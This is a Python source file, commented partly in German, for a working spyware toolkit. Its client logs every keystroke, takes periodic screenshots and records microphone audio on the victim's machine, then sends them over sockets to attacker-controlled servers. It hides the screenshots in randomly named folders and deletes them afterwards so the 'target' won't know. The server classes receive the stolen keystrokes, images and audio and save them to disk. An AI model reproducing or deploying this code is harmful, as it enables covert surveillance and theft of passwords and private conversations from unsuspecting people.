from pynput import keyboard
import time
import sys
import socket
import pyautogui as pg
import subprocess
import os
import math
import pyaudio
import wave
import threading
import ast
import BetterPrinting as bp
import random

def daten_aufnehemen():
    format = pyaudio.paInt16
    kanäle = 2
    rate = 44100
    chunk = 1024
    seconds = listening_time + 1

    audio = pyaudio.PyAudio()

    #start Recording
    stream = audio.open(format=format, channels=kanäle,
                        rate=rate, input=True,
                        frames_per_buffer=chunk)
    #print("recording...")
    frames = []

    for i in range(0, int(rate / chunk * seconds)):
        data = stream.read(chunk)
        frames.append(data)

    #print("finished recording")

    #stop Recording
    stream.stop_stream()
    stream.close()
    audio.terminate()

    listening_data = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listening_data.connect((ip_listener, port_listener))
    #Connection with ServerListener

    str_frames = str(frames)
    listening_data.send(str_frames.encode())
    # Sends data to ServerListener

def all_dir():
    global random_lst
    zeichen = "qwertzuiopasdfghjklyxcvbnm1234567890"
    random_lst = ["".join(random.sample(zeichen, random.randint(4, 10))) for x in range(100)]
    #This makes a list of every directory name randomly
    for dir_name in random_lst:
        os.system(f"mkdir {dir_name}")
        #The directory is being made here

    random_dir = random.choice(random_lst)
    os.chdir(random_dir)
    #We are now in that directory where the image can be stored

def client(ip_photos, port_photos):
    global fhandle
    # fhandle is the variable which opens the foto
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip_photos, port_photos))
    # This connects to the server you specified
    image = pg.screenshot()
    # "image" screenshots the current image after a specific time
    fotoname = "Image.png"
    # Name of the image
    image.save(fotoname)
    # Saves the image in the current directory
    fhandle = open(fotoname, "rb")
    # Opens the image

    full_msg = b""
    # Every image information will be stored in "full_msg"
    for line in fhandle:
        full_msg += line

    s.send(full_msg)

def countdown_send(zeit, ip_photos, port_photos, ip_keylogger, port_keylogger):
    seconds_list = [zahl for zahl in range(0, zeit + 1, 60) if zahl != 0]
    # The seconds the image will be sent in 60 steps to the server will be saved in "seconds_list"
    seconds_list = seconds_list + [20, 40]
    # The image will always be sent at the 20th and the 40th second so if the client suddenly dies some data will still be sent
    print(seconds_list)
    key_data = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        for x in range(zeit + 1):
            if x == 20:
                all_dir()
            print(x)
            zeit -= 1
            time.sleep(1)
            if x in seconds_list:
                client(ip_photos, port_photos)
                # The images will be sent
        key_data.connect((ip_keylogger, port_keylogger))
        # This is the ip and the port of the server the port shouldn't be the same the server_photos and the server_keylogger shouldn't be
        # in the same folder

        wort = ""
        for zeichen in richtige_liste:
            wort += zeichen

        # Sends the data to server_keylogger
        key_data.send(wort.encode())
        print(wort)
        print(richtige_liste)
        fhandle.close()
        # Closes the image
        os.remove("Image.png")
        # Deletes the image in the current directory
        os.chdir("..")
        #We have to go back so that we can delete the other directories
        for each_dir in random_lst:
            os.system(f"rmdir {each_dir}")
            #This deletes every directory
        sys.exit()
        # Stops the keylogger
    except KeyboardInterrupt:
        #If the target has destroyed the connection
        wort = "***%§§)§§%"
        #This is like a special code. To split it at the end
        for zeichen in richtige_liste:
            wort += zeichen
        data = f"THE CONNECTION HAS BEEN INTERRUPTED{wort}"
        #This let's the server know that the server is should shutdown
        key_data.connect((ip_keylogger, port_keylogger))
        key_data.send(data.encode())
        key_data.close()

        if os.path.exists("Image.png"):
            #It will destroy the image so target wound know anything
            fhandle.close()
            os.remove("Image.png")
            #This removes the image

richtige_liste = []


def on_press(key):
    global richtige_liste
    try:
        print(f'Alphabetische Taste wurde gedrückt: {key.char} ')
        richtige_liste += key.char
        # Every pressed key will be saved in "richtige_liste" this is a german word and means "right_list"

        print(richtige_liste)
    except AttributeError:
        print(f'Eine andere Taste wurde gedrückt: {key}')
        if key == keyboard.Key.space or key == keyboard.Key.tab:
            richtige_liste += "{"
            # If the target presses tab or space a "{" will be appended to the list so the attacker knows when and
            # space or a tab key has been pressed

def on_release(key):
    print(f'Key released: {key}')


class KeyloggerTarget:
    def __init__(self, ip_of_server_photos, port_of_server_photos, ip_of_server_keylogger_data,
                 port_of_server_keylogger_data,ip_of_server_listener, port_of_server_listener,ip_of_timer, port_of_timer,  duration_in_seconds=200):
        global listening_time
        global ip_listener
        global port_listener
        # "duration_in_seconds" tells the programm how long it should last the default time is 200 seconds that's 3 Minutes and 20 Seconds
        self.ip_photos = ip_of_server_photos
        self.port_photos = port_of_server_photos
        self.ip_keylogger = ip_of_server_keylogger_data
        self.port_keylogger = port_of_server_keylogger_data
        self.ip_listener = ip_of_server_listener
        self.port_listener = port_of_server_listener
        self.duration = duration_in_seconds
        self.ip_timer = ip_of_timer
        self.port_timer = port_of_timer

        ip_listener = self.ip_listener
        port_listener = self.port_listener
        listening_time = self.duration

    def start(self):
        if self.duration < 60:
            raise TypeError(f"{self.duration} is not greater and not equal to 60")
        # "duration_in_seconds" should always be bigger than 60 seconds
        else:
            listening_thread = threading.Thread(target=daten_aufnehemen)
            listening_thread.start()

            send_timer = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            send_timer.connect((self.ip_timer, self.port_timer))

            send_timer.send(str(self.duration).encode())
            send_timer.close()

            with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
                countdown_send(self.duration, self.ip_photos, self.port_photos, self.ip_keylogger, self.port_keylogger)
                listener.join()

                # This listens to the keys that where typed


class ServerKeylogger:
    # This is the class of the Server. Both Server should not be in the same file
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port

    def start(self):
        try:
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.bind((self.ip, self.port))
            server.listen(1000)

            bp.color("Waiting for connection....", "magenta")
            clientsocket, ipaddress = server.accept()
            # Data is in clientsocket and the ip-address is obviously in "ipaddress"
            bp.color(f"\nConnection has been established with {ipaddress}", "magenta")

            full_msg = ""
            while True:
                msg = clientsocket.recv(8192).decode()
                #More Data can be accepted due to a bigger buffer size
                if len(msg) <= 0: break
                full_msg += msg

            if "THE CONNECTION HAS BEEN INTERRUPTED" not in full_msg:
                #To know if the server has some issues
                for zeichen in full_msg:
                    if "{" == zeichen:
                        # "{" this detects if a space or a tab is in full_msg
                        full_msg = full_msg.replace("{", " ")

                # The data is being stored in full_msg
                bp.color(f"Text of target: {full_msg}", "magenta")
                zeit = time.strftime("%H-%M-%S-%Y")
                # This is the time the data has arrived
                if full_msg != "":
                    with open(f"Keylogger of the target Time {zeit}.txt", "a+", encoding="utf-8") as file:
                        file.write(f"HERE IS EVERYTHING THE TARGET HAS TYPED \n\n{full_msg}")

                else:
                    bp.color("The Target didn't type something...", "magenta")

            else:
                spalten = full_msg.split("***%§§)§§%")
                #This splits the data with the special code
                if spalten[1] != "":
                    #If the data is not empty
                    text = spalten[1]
                    for zeichen in text:
                        if "{" == zeichen:
                            text = text.replace("{", " ")
                    bp.color(f"Text of target: {text}", "magenta")
                    zeit = time.strftime("%H-%M-%S-%Y")
                    # This is the time the data has arrived
                    with open(f"Keylogger of the target Time {zeit}.txt", "a+", encoding="utf-8") as file:
                        file.write(f"HERE IS EVERYTHING THE TARGET HAS TYPED \n\n{text}")
                        #That means data will appear even if the connection isn't stabled
                else: bp.color("The target hasn't written something in the meanwhile", "magenta")

                bp.color("\nTHE CONNECTION HAS BEEN INTERRUPTED", "magenta")
                bp.color("THE SERVER WILL BE DESTROYED\n", "magenta")
                os._exit(0)
                #This shuts down the server

        except OSError:
            raise OSError("Change the port number to run without an error")

class ServerPhotos:
    # This is the class of the Server. Both Server should not be in the same file
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port

    def start(self):
        bp.color("Cyan: ServerPhotos", "cyan")
        bp.color("Blue: ServerKeylogger", "magenta")
        bp.color("Green: ServerListener", "green")
        print("White: Timer\n")
        try:
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.bind((self.ip, self.port))
            server.listen(1000)

            anzahl = 0
            while True:
                bp.color("Waiting for connection...", "cyan")
                client_socket, address = server.accept()
                bp.color(f"\n\nConnection has been established with {address}", "cyan")
                # Data is in client_socket and the address is obviously in "ipaddress"
                full_msg = b""
                # All the binary data is being stored in full_msg as in the previous classes
                while True:
                    msg = client_socket.recv(8192)
                    if len(msg) <= 0: break
                    full_msg += msg
                client_socket.close()
                anzahl += 1

                with open(f"New_Image ({anzahl}).png", "wb") as file:
                    # This stores the image
                    file.write(full_msg)

                # "anzahl" is for the amount of photos
                if anzahl > 1: bp.color(f"{anzahl} Images has been saved to your working directory", "cyan")
                else: bp.color(f"{anzahl} Image have been saved to your working directory", "cyan")
                #Detetcts how many Image have been saved to your directory


        except OSError:
            raise OSError("Change the port number to run without an error")

class ServerListener:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port

    def start(self):
        global urgent
        try:
            listening_data = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            listening_data.bind((self.ip, self.port))
            listening_data.listen(1000)
            # 5 possible connections
            bp.color("Waiting for connection...", "green")
            # Waits for a connection

            client_socket, ipaddress = listening_data.accept()
            bp.color(f"Connection has been established with {ipaddress}", "green")
            check = 0
            full_msg = ""
            while True:
                msg = client_socket.recv(30000000).decode()
                # The buffersize is 300000000 because there is a lot of data in audio files
                if len(msg) <= 0: break
                full_msg += msg

            listening_data.close()
            frames = ast.literal_eval(full_msg)
            data_file = wave.open("Audio of target.wav", "wb")
            data_file.setnchannels(2)
            data_file.setsampwidth(2)
            data_file.setframerate(44100)
            data_file.writeframes(b''.join(frames))
            data_file.close()
            bp.color('"Audio of target.wav" has been saved to your directory', "green")

            #This stores everything the target was talking

        except OSError:
            raise OSError("Change the port number to run without an error")

class Timer:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port

    def countdown(self, seconds):
        minuten = seconds / 60
        minutes = math.floor(minuten)
        false_second = minutes * 60
        exact_seconds = seconds - false_second

        print(f"The target is being connected. The IP of the target is coming....")
        while seconds:
            mins, secs = divmod(seconds, 60)
            timer = '{:02d}:{:02d}'.format(mins, secs)
            print(f"\rTime left: {timer}", end="")
            time.sleep(1)
            seconds -= 1


        if minutes == 0: print(f"\nSuccessful connection for {exact_seconds} seconds")
        elif exact_seconds == 0: print(f"\nSuccessful connection for {minutes} minutes")
        else: print(f"\nSuccessful connection for {minutes} minutes and {exact_seconds} seconds")

    def start_timer(self):
        show_time = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        show_time.bind((self.ip, self.port))
        show_time.listen(10)

        client_socket, ipaddress = show_time.accept()
        full_msg = ""
        while True:
            msg = client_socket.recv(10).decode()
            if len(msg) <= 0: break
            full_msg += msg

        seconds = int(full_msg)
        self.countdown(seconds)
